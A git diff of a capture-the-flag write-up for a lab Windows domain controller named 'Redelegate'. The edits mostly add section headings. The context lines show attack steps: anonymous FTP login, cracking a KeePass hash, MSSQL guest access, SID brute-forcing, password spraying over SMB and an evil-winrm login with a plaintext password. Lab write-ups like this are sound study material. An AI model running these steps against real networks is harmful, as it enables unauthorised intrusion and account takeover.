@@ -39,6 +39,8 @@ PORT      STATE SERVICE
 ``` 
 The site return nothing interesting but we can login on the FTP :
 
+## Find Creds
+
 ```bash
 nxc ftp 10.10.69.178 -u anonymous -p ''                         
 FTP         10.10.69.178    21     10.10.69.178     [*] Banner: Microsoft FTP Service
@@ -87,6 +89,8 @@ john --wordlist=wordlist.txt hash.txt
 Shared:REDACTED
 ```
 Open the keepass file and retrieve the pass of ```SQLGuest```
+
+## Get all users with mssql
 
 ```bash
 nxc mssql 10.10.69.178 -u 'SQLGuest' -p 'REDACTED' --local-auth 
@@ -137,7 +141,7 @@ SQL (SQLGuest  guest@master)> SELECT SUSER_SID('REDELEGATE\Administrator')
 -----------------------------------------------------------   
 b'010500000000000515000000a185deefb22433798d8e847af4010000'
 ```
-But we can try to brute force RID to get all users on the domain, for example with this python script :
+But we can try to brute force SID to get all users on the domain, for example with this python script :
 
 ```python
 import subprocess
@@ -186,6 +190,8 @@ SID trouvé : S-1-5-21-4024337825-2033394866-2055507597-1119 -> Nom d'utilisateu
 ```
 So we can spray some weak passwords :
 
+## FootHold
+
 ```bash
 nxc smb redelegate.vl -u users.txt -p 'REDACTED' --continue-on-success
 SMB         10.10.69.178    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
@@ -221,6 +227,8 @@ WINRM       10.10.69.178    5985   DC               [+] redelegate.vl\helen.fros
 ```bash
 evil-winrm -u "helen.frost" -p "newP@ssword2022" -i "redelegate.vl"
 ```
+## Privesc with delegations
+
 After some enumerations we can see that :
 
 ```powershell
